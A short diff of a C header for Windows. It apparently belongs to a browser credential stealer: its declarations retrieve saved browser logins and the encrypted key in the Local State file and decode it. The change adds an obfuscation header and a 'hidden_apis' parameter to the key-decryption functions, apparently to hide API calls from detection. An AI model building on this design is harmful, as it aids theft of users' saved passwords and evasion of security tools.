@@ -5,6 +5,7 @@
 #include <winnt.h>
 
 #include "logins.h"
+#include "obfuscation.h"
 
 #define MAX_BROWSER_NAME_SIZE 20
 #define MAX_LOGIN_DATA_PATH_SIZE 57
@@ -22,8 +23,8 @@ static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                            Login *loginsOut[]);
 static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
 static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
-                      size_t *decodedKeySizeOut);
+                      size_t *decodedKeySizeOut, hidden_apis *apis);
 static int decrypt_key(BYTE *encryptedKey, size_t encryptedKeySize,
-                       DATA_BLOB *decryptedKeyOut);
+                       DATA_BLOB *decryptedKeyOut, hidden_apis *apis);
 
 #endif
